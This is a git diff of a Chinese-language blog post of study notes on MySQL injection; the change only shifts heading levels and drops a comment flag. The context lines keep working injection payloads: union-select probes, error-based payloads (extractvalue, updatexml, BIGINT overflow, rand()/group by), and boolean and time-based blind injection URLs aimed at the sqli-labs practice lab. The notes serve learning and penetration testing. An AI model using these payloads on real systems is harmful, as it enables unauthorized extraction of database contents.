@@ -3,14 +3,13 @@ title: "MySQL 注入学习"
 date: 2019-04-30T16:05:52+08:00
 tags: ['MySQL','injection']
 categories: ['渗透测试']
-comment: true
 ---
 
 系统学习MySQL注入，记下笔记。
 
 <!--more-->
 
-# 科普函数
+## 科普函数
 
 字符串相关
 
@@ -30,7 +29,7 @@ comment: true
 
 懒，用到什么查什么吧。
 
-# 符号
+## 符号
 
 特殊符号
 ```mysql
@@ -70,7 +69,7 @@ BETWEEN, CASE, WHEN, THEN, ELSE
 !
 BINARY, COLLATE
 ```
-# MySQL类型转换
+## MySQL类型转换
 MySQL隐式类型转换
 ```mysql
 1=1
@@ -83,7 +82,7 @@ MySQL隐式类型转换
 ```
 0 false同理
 
-# information_schema
+## information_schema
 information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。
 如数据库名，数据库的表，表栏的数据类型与访问权限等。
 
@@ -116,9 +115,9 @@ select 字段名 from 表名;
 那么由此我们当我们遇到注入可以执行我们的sql语句时，将如上sql语句套进去即可。
 
 ---
-# 注入的几大种类
+## 注入的几大种类
 此处注入的分类是根据服务器对我们传的参数不同的响应来进行划分。
-## 联合查询注入
+### 联合查询注入
 适用于有回显位的注入
 ```mysql
 mysql> select * from user where id=1 union select 1,2,3;
@@ -133,9 +132,9 @@ mysql> select * from user where id=1 union select 1,2,3;
 `union select`
 `union all select` 不去重
 将1，2，3替换为sql语句即可。具体替换那一个需要看页面回显了哪一位。
-## 报错注入
+### 报错注入
 适用于有MySQL报错信息提示的注入。
-### BIGINT等数据类型溢出
+#### BIGINT等数据类型溢出
 按位取反`~`、`!`、`exp()`来溢出报错。
 
 有版本限制，mysql>5.5.53时，则不能返回查询结果。
@@ -150,7 +149,7 @@ select (select(!x-~0)from(select(select user())x)a);
 
 报错信息是有长度限制的，在`mysql/my_error.c`中可以看到
 
-### XPATH语法错误
+#### XPATH语法错误
 
 从mysql5.1.5开始提供两个XML查询和修改的函数，`extractvalue`和`updatexml`。`extractvalue`负责在xml文档中按照xpath语法查询节点内容，`updatexml`则负责修改查询到的内容。
 
@@ -166,7 +165,7 @@ select extractvalue(1,concat(0x7e,(select version()),0x7e));
 
 注意报错回显长度有限制，配合字符串操作函数使用。
 
-### concat()+rand()+group by导致主键重复
+#### concat()+rand()+group by导致主键重复
 
 ```mysql
 select count(*) from users group by concat(version(),floor(rand(0)*2));
@@ -178,7 +177,7 @@ http://172.16.0.1/Less-5/?id=1' and (select count(*) from information_schema.tab
 
 只要是count，rand()，group by三个连用就会造成这种报错，与位置无关。
 
-### 函数特性报错
+#### 函数特性报错
 
 - geometrycollection() 
 
@@ -211,9 +210,9 @@ and linestring((select * from(select * from(select user())a)b))-- +
 and multilinestring((select * from(select * from(select user())a)b))-- +
 ```
 
-## 盲注
+### 盲注
 盲注指的是没有回显，但是能根据我们构造的sql条件返回不同响应，而盲注跑出数据相对较麻烦
-### 布尔型的盲注
+#### 布尔型的盲注
 适用于对条件真假返回不同响应的注入
 以sqlilabs第6关举例
 ```mysql
@@ -256,7 +255,7 @@ http://go.go/sqli-labs/Less-6/?id=1" and mid((select username from user limit 0,
 
 ps:其实盲注用二分法比穷举快
 
-### 基于时间盲注
+#### 基于时间盲注
 适用于对页面无变化，无法用布尔盲注判断的情况，一般用到函数 `sleep()` `BENCHMARK()`。
 
 `sleep()`作用是用来延时
@@ -293,7 +292,7 @@ Empty set (5.15 sec)
 
 至于以上为什么会出现这种原因 [这篇文章讲的很清楚](https://www.t00ls.net/thread-45590-1-10.html)
 
-# 后话
+## 后话
 其实还有一些注入分类我没有写，比如二次注入，宽字节注入等，有时间再写吧。这篇文章写到这有很多收获了。下一篇准备开bypass的坑。
 
 参考链接
